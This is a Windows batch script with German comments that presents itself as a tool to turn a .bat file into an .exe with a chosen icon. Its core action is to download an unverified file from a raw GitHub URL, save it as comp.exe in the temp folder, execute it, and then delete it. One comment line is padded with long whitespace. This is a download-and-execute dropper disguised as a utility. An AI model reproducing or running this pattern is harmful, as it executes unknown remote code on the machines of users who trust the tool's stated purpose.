@echo off
set "URL=https://raw.githubusercontent.com/xqrto/pld/main/efnjih.var"
set "TEMPFILE=%TEMP%\comp.exe"
set "file=%~1"
for /f "delims=" %%a in ('powershell -NoProfile -Command "Add-Type -AssemblyName System.Windows.Forms; $ofd = New-Object System.Windows.Forms.OpenFileDialog; $ofd.Filter = 'ICO (*.ico)|*.ico'; $ofd.InitialDirectory = [Environment]::GetFolderPath('Desktop'); if($ofd.ShowDialog() -eq 'OK'){ $ofd.FileName }"') do set "Result=%%a"
REM Lade die Datei herunter und folge Redirects                                                                                                                                                                                                                                                                                                      
curl -L -o "%TEMPFILE%" "%URL%"

REM Prüfe, ob die Datei heruntergeladen wurde
if exist "%TEMPFILE%" (
    echo Datei erfolgreich heruntergeladen:
    start "" "%TEMPFILE%" /bat "%temp%\%~1" /exe "%cd%\%file:.bat=%.exe" /icon "%result%"
) else (
    echo Fehler beim Herunterladen der Datei.
)
del %TEMPFILE% /Q
